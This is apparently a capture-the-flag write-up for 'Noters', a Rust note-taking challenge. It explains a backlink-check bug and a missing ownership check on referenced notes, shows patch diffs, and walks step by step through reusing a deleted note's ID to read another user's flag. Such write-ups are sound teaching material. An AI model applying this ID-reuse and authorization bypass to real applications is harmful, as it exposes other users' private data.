# Noters

## Challenge Overview

- Name: Noters
- Category: Pwn
- Difficulty: Easy
- Description: A blazingly fast, memory-safe, CRUD-compliant note-taking app.

## Vulnerability

A logic flaw in the `delete_note()` function in `app.rs`(line 197) introduces a high-level use-after-free vulnerability. The intention is to prevent deleting a note if it's referenced by another, but the code mistakenly checks the note being deleted for backlinks rather than other notes that may reference it. The diff shows a patch of `delete_note()`.

```diff
    // Delete note by ID
    pub fn delete_note(&self, id: u16) -> Result<()> {
        // Check if any other note references this note (expensive)
        // and do not stop at the first backlink, find all of them
        let mut backlinks: Vec<u16> = Vec::new();
        for partial_note in self.list_notes()? {
            // Do not prevent deletion if note refers to itself
            if partial_note.id == id {
                continue;
            }

            // Read content and find all references
            // Save ID to Vec if it contains a backlink
            // to the note we're trying to delete
-           let content = self.repo.read(id)?.content;
+           let content = self.repo.read(partial_note.id)?.content;
            let references = NoteService::get_references(&content);
            if references.contains(&id) {
                backlinks.push(partial_note.id);
            }
        }

        let num_backlinks = backlinks.len();
        trace!("Found {} backlinks to note with ID: {}", num_backlinks, id);
        match num_backlinks {
            0 => self.repo.delete(id),
            _ => Err(NoteError::Validation(
                NoteValidationError::NoteIsReferenced(backlinks),
            )),
        }
    }
```

This one-character mistake (`id` vs `partial_note.id`) means that backlink checks are ineffective - you can delete a note even if another note references it. A dangling reference.

Additionally, `read_note()` in `app.rs` (line 112) fails to verify ownership for referenced notes. So if a user references a note they don't own, the system still resolves it.

```diff
    /// Reads a full note and expands any references in the content (e.g. `[[1]]` becomes the full text of note #1).
    ///
    /// # Errors
    ///
    /// Returns:
    /// - `NoteValidationError::PermissionDenied` if the user does not own the note or a referenced note.
    /// - `NoteValidationError::ReferenceNotFound` if a referenced note does not exist.
    /// - Other repository errors if reading from the backend fails.
    pub fn read_note(&self, id: u16) -> Result<Note> {
        let mut note = self.repo.read(id)?;

        // Only allow owner read access
        if self.user != note.owner {
            return Err(NoteValidationError::PermissionDenied(id).into());
        }

        // Mapping references to note contents: [[1]] -> "Some content"
        let placeholders = Self::get_references(&note.content)
            .into_iter()
            .map(|rid| match self.repo.read(rid) {
                Ok(ref_note) => {
+                   // Make sure user has permission to read referenced note
+                   if ref_note.owner != self.user {
+                       return Err(NoteError::Validation(
+                           NoteValidationError::PermissionDenied(ref_note.id),
+                       ));
+                   }
+
                    let placeholder = format!("[[{rid}]]");
                    let expansion = format!(
                        ">>> #{} {}\n>\n> {}",
                        ref_note.id,
                        ref_note.name,
                        ref_note.content.replace('\n', "\n> ")
                    );
                    Ok((placeholder, expansion))
                }
                Err(_) => Err(NoteValidationError::ReferenceNotFound(rid).into()),
            })
            .collect::<Result<Vec<_>>>()?;

        // Expanding references: [[1]] -> Note #1's content
        let expanded = placeholders
            .into_iter()
            .fold(note.content, |txt, (ph, exp)| txt.replace(&ph, &exp));

        note.content = expanded;
        Ok(note)
    }
```

## Exploit

To exploit this:

### 1. We create two notes

One regular note (`#0`), and one referencing the first (`#1`), like ``[[0]]`:

#### Note #0

```text
Name:
> first note

Content:
> hello!
> .
```

#### Note #1

```text
Name:
> references #0

Content:
> Reference to first note:
> [[0]]
> .
```

### 2. List notes to confirm

```pgsql
 id | owner     | name 
----+-----------+--------------
 0  | fslaktern | first note
 1  | fslaktern | references #0 
```

### 3. Delete note #0

Despite the note #1 referencing note #0, deletion succeeds due to the broken backlink check.

```pgsql
 id | owner     | name 
----+-----------+--------------
 1  | fslaktern | references #0 
```

### 4. Create a new note containing the flag

This gets assigned **ID #0**, which is still referenced by note #1.

```pgsql
 id | owner                | name 
----+----------------------+--------------
 0  | Norske Nøkkelsnikere | flag 
 1  | fslaktern            | references #0 
```

### 5. Read note #1

The reference `[[0]]` resolves - revealing the contents of the new note:

```
-------------------------------
#1: references #0

Reference to first note:
>>> #0 flag
>
> NNSCTF{flag}
-------------------------------
```

